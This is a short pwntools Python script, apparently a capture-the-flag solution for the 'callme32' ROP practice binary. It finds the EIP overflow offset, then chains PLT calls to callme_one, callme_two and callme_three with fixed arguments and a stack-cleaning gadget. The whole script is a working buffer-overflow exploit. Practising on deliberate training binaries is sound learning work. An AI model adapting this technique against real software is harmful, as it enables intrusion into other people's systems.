from pwn import *

# context(arch="i686", os="linux")

elf = ELF("./callme32", checksec=False)
p = elf.process()

p.sendline(cyclic(128))
p.wait()
eip_offset = cyclic_find(p.corefile.eip)
p = elf.process()							# reinitializing the process

callme_one_plt = elf.plt["callme_one"]
callme_two_plt = elf.plt["callme_two"]
callme_three_plt = elf.plt["callme_three"]

args = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# ROP-gadget to pop the args
gadget = p32(0x080487f9) # pop esi ; pop edi ; pop ebp ; ret

payload = "A" * eip_offset
payload += p32(callme_one_plt) + gadget + args
payload += p32(callme_two_plt) + gadget + args
payload += p32(callme_three_plt) + "JUNK" + args

log.info('Payload length: %d', len(payload))
log.info('Sending payload...')
p.sendlineafter("> ", payload)
log.info('Payload sent!')

p.wait()
success(p.recv())